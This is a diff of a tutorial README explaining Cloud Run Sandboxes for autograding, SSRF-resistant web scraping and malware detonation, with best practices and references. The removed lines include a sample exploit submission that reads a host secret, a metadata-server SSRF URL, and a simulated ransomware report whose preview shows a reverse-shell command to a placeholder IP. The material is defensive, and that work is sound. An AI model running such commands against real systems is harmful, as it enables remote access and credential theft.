-#### The Cloud Run Sandbox Solution
-- The hidden test cases live in `/app/test_suite` on the host container.
-- When a submission arrives, the host writes it to a temporary directory (`/tmp/sub_<id>`).
-- The sandbox runs with **two read-only bind mounts**:
-  `--mount type=bind,source=/app/test_suite,destination=/mnt/test_suite,readonly`
-  `--mount type=bind,source=/tmp/sub_<id>,destination=/mnt/student,readonly`
-- `--allow-egress` is **omitted** (strict zero egress).
-- A strict timeout (5 seconds) kills runaway loops cleanly.
+#### How the Sandbox Solves It
+1. **Hidden Test Suite**: Our test runner (`runner.py`) and hidden test cases live on the host container in `/app/test_suite`.
+2. **Dual Read-Only Mounts**: We mount the test suite and the student's submission as two separate, read-only paths:
+   ```bash
+   --mount type=bind,source=/app/test_suite,destination=/mnt/test_suite,readonly
+   --mount type=bind,source=/tmp/submission_123,destination=/mnt/student,readonly
+   ```
+3. **No Network Access**: The `--allow-egress` flag is omitted, making cheating via network calls impossible.
+4. **Timeouts**: A 5-second timeout kills any infinite loops automatically.
 
-#### Implementation Highlights (`examples/02-educational-autograder/`)
-
-**Test Runner (`test_suite/runner.py`):**
-```python
-import sys, json, importlib.util
-
-TEST_CASES = [
-    {"nums": [2, 7, 11, 15], "target": 9, "expected": [0, 1]},
-    {"nums": [3, 2, 4], "target": 6, "expected": [1, 2]},
-    {"nums": [3, 3], "target": 6, "expected": [0, 1]},
-    {"nums": [-1, -2, -3, -4, -5], "target": -8, "expected": [2, 4]},
-]
-
-def load_student_module(path="/mnt/student/solution.py"):
-    spec = importlib.util.spec_from_file_location("student", path)
-    mod = importlib.util.module_from_spec(spec)
-    spec.loader.exec_module(mod)
-    return mod
-
-def run():
-    report = {"total_tests": len(TEST_CASES), "passed_tests": 0, "failed_tests": 0, "verdict": "ACCEPTED", "details": []}
-    student = load_student_module()
-    for idx, tc in enumerate(TEST_CASES, 1):
-        actual = student.two_sum(list(tc["nums"]), tc["target"])
-        if actual and sorted(actual) == sorted(tc["expected"]):
-            report["passed_tests"] += 1
-            report["details"].append({"test": idx, "status": "PASSED"})
-        else:
-            report["failed_tests"] += 1
-            report["verdict"] = "WRONG_ANSWER"
-            report["details"].append({"test": idx, "status": "FAILED"})
-    print(json.dumps(report))
-
-if __name__ == "__main__":
-    run()
-```
-
-**Autograder Orchestration (`autograder.py`):**
-```python
-cmd = [
-    SANDBOX_BIN, "do",
-    "--mount", f"type=bind,source={TEST_SUITE_DIR},destination=/mnt/test_suite,readonly",
-    "--mount", f"type=bind,source={work_dir},destination=/mnt/student,readonly",
-    "--",
-    "/usr/bin/python3", "/mnt/test_suite/runner.py"
-]
-proc = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
-```
-
-#### Grading Malicious Exploits
-When a student submits code attempting to read `/etc/passwd`, steal environment variables, or write to `/tmp`:
-```python
-# sample_submissions/malicious_exploit.py
-import os, urllib.request
-def two_sum(nums, target):
-    secret = os.getenv("AUTOGRADER_SECRET_KEY", "NOT_FOUND") # Returns NOT_FOUND
-    # Any write to /tmp without --write fails immediately
-    return [0, 1]
-```
-The sandbox shields all host secrets and blocks disk tampering.
+#### Code Location
+Check out [`examples/02-educational-autograder/`](examples/02-educational-autograder/) for the complete runnable code, including sample submissions for:
+- Correct solutions
+- Infinite loops
+- Malicious exploit attempts
 
 ---
 
-### Use Case 2: AI-Assisted Autonomous Web Scraper & Research Agent
+### Use Case 2: AI Web Research Scraper (With SSRF Defense)
+
+AI research agents often need to browse the web, scrape target pages, and extract data.
 
 ```mermaid
-flowchart TB
-    User["User / Agent Planner"] -->|"POST /scrape (URL)"| Host["Cloud Run Scraper Service<br/><i>(Contains LLM API Keys)</i>"]
-
-    subgraph SandboxBoundary ["Cloud Run Sandbox Boundary (--allow-egress)"]
-        Worker["Scraper Worker Process<br/><code>BeautifulSoup / urllib</code>"]
-    end
-
-    Target["External Website<br/><i>(Untrusted Target)</i>"]
-    Meta["GCP Metadata Server<br/><code>169.254.169.254</code>"]
-
-    Host -->|"Spawns sandbox do"| Worker
-    Worker -->|"✅ Outbound HTTPS"| Target
-    Target -->>|"Returns HTML payload"| Worker
-    Worker -.->|"❌ Blocked: SSRF Shield"| Meta
-    Worker -.->|"❌ Blocked: Cannot Read Secrets"| Host
-    Worker -->>|"Sanitized JSON (stdout)"| Host
-    Host -->>|"Clean Structured Output"| User
+flowchart TD
+    User["User or AI Agent"] -->|Requests URL to scrape| Service["Scraper Service<br/>(Holds Gemini / OpenAI API Keys)"]
+    Service -->|Launches sandbox with --allow-egress| Sandbox["Isolated Scraper Sandbox"]
+    Sandbox -->|Fetches target webpage| TargetSite["External Website"]
+    TargetSite -->>|Returns HTML| Sandbox
+    Sandbox -.->|BLOCKED: Cannot touch Google metadata| Meta["Metadata Server (169.254.169.254)"]
+    Sandbox -.->|BLOCKED: Cannot see host API keys| Service
+    Sandbox -->>|Returns clean text / JSON| Service
+    Service -->>|Returns safe results| User
 ```
 
-#### The Architecture & Challenge
-Autonomous research agents crawl third-party websites to extract data, download documents, and summarize content. 
-However, web scraping poses severe security vulnerabilities:
-1. **Server-Side Request Forgery (SSRF)**: An attacker-controlled target website might redirect the scraper to `http://169.254.169.254/computeMetadata/v1/` to extract access tokens.
-2. **Untrusted HTML Parsing Flaws**: Vulnerabilities in HTML parsers or browser engines can result in arbitrary native code execution.
-3. **Leaking Agent API Keys**: If the scraper process crashes with a traceback or dumps memory, any environment variables (e.g. `GEMINI_API_KEY`, `OPENAI_API_KEY`) present in that process are exposed.
+#### The Problem
+When you scrape external websites:
+1. **SSRF attacks**: A malicious website can return an HTTP 302 redirect pointing to `http://169.254.169.254` to steal your Google Cloud tokens.
+2. **Parser exploits**: Malformed HTML can exploit vulnerabilities in parsers or browser engines.
+3. **Leaking LLM keys**: If the scraper process crashes and dumps memory, any API keys in its environment could be exposed.
 
-#### The Cloud Run Sandbox Solution
-- The scraping script is launched inside a sandbox with **`--allow-egress`** enabled so it can connect to external websites.
-- **Critical Cloud Run Invariant**: Even with `--allow-egress`, Cloud Run Sandboxes **actively block queries to the GCP Metadata Server (`169.254.169.254`)**!
-- The host agent's environment variables (`LLM_API_KEY`, `DATABASE_URL`) are completely withheld from the sandbox.
-- The scraper runs in isolation and communicates results purely as sanitized JSON over stdout.
+#### How the Sandbox Solves It
+1. **Controlled Egress**: We pass `--allow-egress` so the scraper can talk to external websites over HTTPS.
+2. **Built-in SSRF Immunity**: Even with `--allow-egress` enabled, Cloud Run Sandboxes **still block calls to `169.254.169.254`**. The metadata server is never reachable.
+3. **Protected API Keys**: The host application holds your Gemini or OpenAI API keys, while the sandbox runs with zero environment variables.
 
-#### Implementation Highlights (`examples/03-autonomous-web-scraper/`)
-
-```python
-# Launching the scraper with network egress
-cmd = [
-    SANDBOX_BIN, "do",
-    "--allow-egress",
-    "--",
-    "/usr/bin/python3", "-c", scraper_script
-]
-proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
-```
-
-#### Proving SSRF Immunity (`POST /test/ssrf-metadata-check`)
-Even when `--allow-egress` is active, executing an SSRF probe against the metadata server yields:
-```json
-{
-  "sandbox_egress_flag": true,
-  "probe_result": {
-    "metadata_access": "BLOCKED: URLError",
-    "llm_key_access": "NOT_ACCESSIBLE"
-  },
-  "verdict": "SECURE: Metadata server and host environment variables are strictly shielded despite internet egress."
-}
-```
+#### Code Location
+Check out [`examples/03-autonomous-web-scraper/`](examples/03-autonomous-web-scraper/) to see the scraper agent and its automated SSRF test endpoint.
 
 ---
 
-### Use Case 3: SecOps Incident Response & Malware Payload Detonator
+### Use Case 3: SecOps Malware & Script Detonation Sandbox
+
+When a security alert flags a suspicious bash script or encoded payload, security analysts need to "detonate" it to see what it actually does.
 
 ```mermaid
 sequenceDiagram
     autonumber
-    actor SecOps as Security Analyst
-    participant Host as Detonator Host
-    participant Box as Detached Sandbox
+    actor Analyst as Security Analyst
+    participant Host as Detonator App
+    participant Box as Background Sandbox
 
-    SecOps->>Host: POST /detonate (untrusted script)
-    Host->>Box: 1. sandbox run (starts detached daemon)
-    Note over Host,Box: Ephemeral background sandbox ready in &lt;100ms
-    Host->>Box: 2. sandbox exec (executes payload)
-    Box->>Box: Payload drops files in /tmp, C2 beacon blocked
-    Host->>Box: 3. sandbox tar (captures overlay to tar)
-    Host->>Box: 4. sandbox delete (teardown)
-    Note over Host: Extracts tar on host, calculates SHA256 & IOCs
-    Host-->>SecOps: Returns Forensic Incident Report
+    Analyst->>Host: Submits suspicious script
+    Host->>Box: Starts background sandbox with writable overlay
+    Host->>Box: Runs suspicious script inside sandbox
+    Note over Box: Script drops files, but network callbacks are blocked
+    Host->>Box: Captures all new/modified files into a tarball
+    Host->>Box: Deletes sandbox
+    Note over Host: Scans tarball for hashes and dropped files
+    Host-->>Analyst: Returns incident report with file artifacts
 ```
 
-#### The Architecture & Challenge
-When a suspicious script, obfuscated bash one-liner, or malware dropper is detected in an alert, security teams need to "detonate" the script to observe its behavior:
-- What files does it create or encrypt?
-- What persistence mechanisms does it install?
-- What network domains or C2 endpoints does it attempt to call?
+#### The Problem
+Running an unknown script on a normal machine is dangerous. Setting up heavy VM-based sandboxes (like Cuckoo) takes minutes per sample and requires expensive infrastructure.
 
-Running this on a developer's workstation or production server is unsafe. Spinning up heavy virtual machine sandboxes (like Cuckoo) takes 30–60 seconds per payload.
+#### How the Sandbox Solves It
+1. **Detached Background Mode**: We start a named sandbox with an ephemeral writable overlay:
+   ```bash
+   sandbox run detox-session --write --detach -- /bin/bash -c "sleep 5m"
+   ```
+2. **Zero-Egress Containment**: The script cannot call out to its Command & Control (C2) servers or spread across your network.
+3. **Forensic Tarball**: After execution, we snapshot all files created or modified by the script using:
+   ```bash
+   sandbox tar detox-session --file=/tmp/evidence.tar
+   ```
+4. **Clean Teardown**: We call `sandbox delete detox-session`, leaving no residue on the host. The host then unzips `evidence.tar` to compute SHA-256 hashes and inspect dropped files safely.
 
-#### The Cloud Run Sandbox Solution
-Cloud Run Sandboxes provide a high-throughput detonation environment:
-1. Spin up a **detached background sandbox** with a writable `tmpfs` overlay:
-   `sandbox run <session_id> --write --detach -- sleep 5m`
-2. Mount the suspicious script read-only and detonate it via `sandbox exec`:
-   `sandbox exec <session_id> -- /bin/bash /mnt/host/payload.sh`
-3. Network egress is denied by default, neutralizing reverse shells and ransomware exfiltration.
-4. Capture a **forensic snapshot of all modified and created files** using:
-   `sandbox tar <session_id> --file=/tmp/evidence.tar`
-5. Destroy the sandbox cleanly:
-   `sandbox delete <session_id>`
-6. The host container inspects `evidence.tar`, generating SHA-256 hashes and file diffs.
-
-#### Implementation Highlights (`examples/04-secops-payload-detonator/`)
-
-**Detonation Workflow (`detonator.py`):**
-```python
-# 1. Start detached sandbox with writable overlay
-subprocess.run([
-    SANDBOX_BIN, "run",
-    "--write", session_id,
-    "--detach",
-    "--mount", f"type=bind,source={host_workdir},destination=/mnt/host,readonly",
-    "--", "/bin/bash", "-c", "sleep 5m"
-], check=True)
-
-# 2. Detonate payload
-proc = subprocess.run([
-    SANDBOX_BIN, "exec", session_id,
-    "--", "/bin/bash", "/mnt/host/payload.sh"
-], capture_output=True, text=True, timeout=req.timeout_sec)
-
-# 3. Export filesystem modifications to tarball
-subprocess.run([
-    SANDBOX_BIN, "tar", session_id,
-    f"--file={tar_path}"
-], check=True)
-
-# 4. Clean up sandbox
-subprocess.run([SANDBOX_BIN, "delete", session_id])
-
-# 5. Extract and analyze dropped files on the host
-with tarfile.open(tar_path, "r") as tar:
-    tar.extractall(path=extract_dir)
-# Compute SHA256 hashes and IOCs...
-```
-
-**Detonating a Simulated Ransomware Dropper:**
-When running the simulated dropper payload (`sample_payloads/ransomware_dropper_sim.sh`), the detonator returns:
-```json
-{
-  "session_id": "detox-84a12f9b",
-  "execution_success": true,
-  "exit_code": 0,
-  "execution_time_ms": 612.4,
-  "dropped_files_count": 3,
-  "dropped_files": [
-    {
-      "filename": "/tmp/README_RESTORE_FILES.txt",
-      "size_bytes": 128,
-      "sha256": "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
-      "preview": "YOUR FILES HAVE BEEN SIMULATED AS ENCRYPTED."
-    },
-    {
-      "filename": "/tmp/.hidden_beacon/backdoor.sh",
-      "size_bytes": 48,
-      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-      "preview": "bash -i >& /dev/tcp/198.51.100.1/4444 0>&1"
-    }
-  ],
-  "c2_callbacks_prevented": true,
-  "metadata_theft_prevented": true
-}
-```
+#### Code Location
+Check out [`examples/04-secops-payload-detonator/`](examples/04-secops-payload-detonator/) for the implementation and a harmless simulated ransomware test script.
 
 ---
 
-## 6. Best Practices & Operational Checklist
+## 6. Best Practices and Gotchas
 
-When designing production systems with Cloud Run Sandboxes, adhere to these guidelines:
+Here are practical lessons learned from running sandboxes in production:
 
-### 1. Resource Sizing (CPU & Memory)
-- **Shared Capacity**: Sandboxes share the CPU and RAM allocated to your Cloud Run instance. If your service has `2GiB` RAM and you execute four concurrent sandboxes each allocating `400MiB`, your container risks an Out-Of-Memory (OOM) crash.
-- **Recommendation**: Configure Cloud Run instance limits (`--memory 4Gi --cpu 2`) and throttle concurrent sandbox executions per instance using an async semaphore.
+### 1. Watch Your CPU and Memory Sizing
+Sandboxes share the CPU and RAM allocated to your Cloud Run instance. If your service has 2 GB of RAM and runs four sandboxes at the same time, each using 400 MB, your instance can run out of memory.
+- **Tip**: Set generous limits on your Cloud Run service (such as `--memory 4Gi --cpu 2`) and limit the number of simultaneous sandboxes per instance using a semaphore.
 
-### 2. Sandbox Mode Selection: `sandbox do` vs Detached `sandbox run`
-- Use **`sandbox do`** for one-off, stateless tasks (e.g. autograding a student submission, running a single math calculation).
-- Use **`sandbox run --detach` + `sandbox exec`** when executing interactive multi-step tasks (e.g. an AI agent iteratively refining a script, or executing multiple commands in <10ms without re-initializing the sandbox).
+### 2. Choose the Right Execution Mode
+- Use **`sandbox do`** for quick, one-off tasks (like grading a single submission or evaluating a math expression).
+- Use **`sandbox run --detach` + `sandbox exec`** when you need to run multiple commands in the same environment (like an AI agent running a script, inspecting the output, and fixing an error).
 
-### 3. Absolute Paths and `$PATH` Configuration
-- Commands inside the sandbox execute in a clean environment. 
-- Always reference binaries by their absolute paths (e.g. `/usr/bin/python3`, `/bin/bash`, `/usr/bin/node`) or explicitly pass `--env PATH=/usr/local/bin:/usr/bin:/bin`.
+### 3. Always Use Absolute Paths
+Sandboxes start with a clean environment. If you run `python3`, it might fail if `PATH` is not explicitly set. 
+- **Tip**: Always specify `/usr/bin/python3`, `/bin/bash`, or pass `--env PATH=/usr/local/bin:/usr/bin:/bin`.
 
-### 4. Never Pass Secrets via `--env`
-- Avoid passing sensitive tokens via `--env API_KEY=xyz` to the sandbox, as processes running inside the sandbox can inspect `/proc/self/environ` or run `env`.
+### 4. Never Put Secrets in `--env`
+Avoid passing sensitive passwords or tokens to the sandbox via `--env`. Any process running inside the sandbox can inspect `/proc/self/environ` or run the `env` command.
 
-### 5. Always Set Subprocess Timeouts
-- Untrusted code can intentionally or accidentally enter infinite loops (`while True: pass`).
-- Always wrap your `subprocess.run()` calls with an explicit `timeout=` parameter to prevent sandbox processes from hanging indefinitely.
+### 5. Always Set a Timeout
+Never run untrusted code without a timeout. A simple `while True: pass` can hang your worker forever if you don't pass `timeout=` to `subprocess.run()`.
 
 ---
 
 ## 7. References & Further Reading
 
-This tutorial draws inspiration from the foundational work, architectures, and announcements from Google Cloud engineering and developer advocacy:
+This guide was inspired by the excellent work and research from Google Cloud engineers and developer advocates:
 
 1. **[Google Cloud Run Sandboxes Are in Public Preview](https://cloud.google.com/blog/topics/developers-practitioners/google-cloud-run-sandboxes-are-in-public-preview)** (Google Cloud Blog)  
-   *By Ryan Pei & Greg Block.* The official announcement introducing in-instance micro-sandboxing at WeAreDevelopers, detailing sub-second execution and the zero-trust security triad.
+   *By Ryan Pei & Greg Block.* The official announcement introducing in-instance sandboxes and the zero-trust security boundaries.
 2. **[Cloud Run Sandboxes Now in Public Preview](https://medium.com/google-cloud/cloud-run-sandboxes-now-in-public-preview-538f077eb3eb)**  
-   *By Sara Ford.* A hands-on guide exploring the `--sandbox-launcher` flag, command syntax, and latency advantages.
+   *By Sara Ford.* A hands-on walkthrough covering the `--sandbox-launcher` flag and CLI command basics.
 3. **[More Things You Can Do with Cloud Run Sandboxes](https://medium.com/google-cloud/more-things-you-can-do-with-cloud-run-sandboxes-5f50fd6d60f2)**  
-   *By Sara Ford.* Practical deep dives into coding katas, running untrusted binaries, and interactive sandbox commands.
+   *By Sara Ford.* Practical examples of running coding challenges and interactive sandbox testing.
 4. **[Cloud Run Sandboxes: Building Secure Execution Plane for AI Agents](https://medium.com/google-cloud/cloud-run-sandboxes-building-secure-execution-plane-for-ai-agents-48aee4acc91e)**  
-   *By Shuva Jyoti Kar.* Architectural patterns for decoupling agent reasoning from execution, designing threat-contained execution planes for production agents.
+   *By Shuva Jyoti Kar.* Architecture patterns for decoupling AI agent reasoning from tool execution.
 5. **[Let Your Agent Run Its Own Code Inside a Cloud Run Sandbox](https://medium.com/google-cloud/let-your-agent-run-its-own-code-inside-a-cloud-run-sandbox-965633fb7f0c)**  
-   *By Sascha Heyer.* Practical patterns integrating Google’s Agent Development Kit (ADK) with the `CloudRunSandboxCodeExecutor`.
+   *By Sascha Heyer.* Integrating Cloud Run Sandboxes with Google's Agent Development Kit (ADK).
 6. **[Eval Is Evil: How to Safely Execute Untrusted AI Code with Cloud Run Sandboxes and ADK](https://medium.com/google-cloud/eval-is-evil-how-to-safely-execute-untrusted-ai-code-with-cloud-run-sandboxes-and-adk-217d1737b5b7)**  
-   *By Daniel Strebel.* An exploration of why traditional `eval()` is vulnerable and how gVisor and Cloud Run micro-sandboxes eliminate the attack surface.
+   *By Daniel Strebel.* Deep dive into why `eval()` creates security vulnerabilities and how in-instance sandboxing fixes them.
 7. **[Official Google Cloud Documentation: Configuring Sandboxes for Services](https://docs.cloud.google.com/run/docs/configuring/services/sandboxes)** & **[Code Execution in Cloud Run](https://docs.cloud.google.com/run/docs/code-execution)**  
-   The authoritative syntax, API references, YAML configurations, and CLI flag documentation.
+   The official Google Cloud documentation for syntax, YAML specs, and CLI flags.
 8. **[Google Developers Codelab: Execute Node.js and Python in Cloud Run Sandboxes](https://codelabs.developers.google.com/codelabs/cloud-run/execute-nodejs-python-in-cloud-run-sandbox)**  
-   Hands-on codelab orchestrating multi-language runtimes dynamically inside Cloud Run sandboxes.
+   A step-by-step hands-on codelab running Python and Node.js in sandboxes with dynamic package installation.
